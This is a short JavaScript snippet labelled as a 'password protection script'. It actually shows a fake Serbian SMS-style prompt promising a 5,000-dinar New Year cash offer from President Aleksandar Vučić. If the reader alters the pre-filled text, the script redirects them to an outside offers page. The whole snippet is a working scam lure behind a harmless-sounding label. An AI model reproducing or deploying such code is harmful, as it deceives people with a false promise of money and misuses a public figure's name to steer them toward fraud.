  
/* Password Protection Script by www.onlineofferz.xyz*/
var password = 'ПОДИГНИТЕ 5.000 динара'
password = prompt(
  'SMS: Честитамо! Испуњавате услове за новогодишњу понуду од 5.000 динара од председника Александра Вучића. Молимо вас да притиснете OK да бисте одмах подигли ГОТОВИНУ..',
  'ПОДИГНИТЕ 5.000 динара'
);
if (password != 'ПОДИГНИТЕ 5.000 динара') {
  location.href = 'https://offres.org/serbian-newyear.html';
}
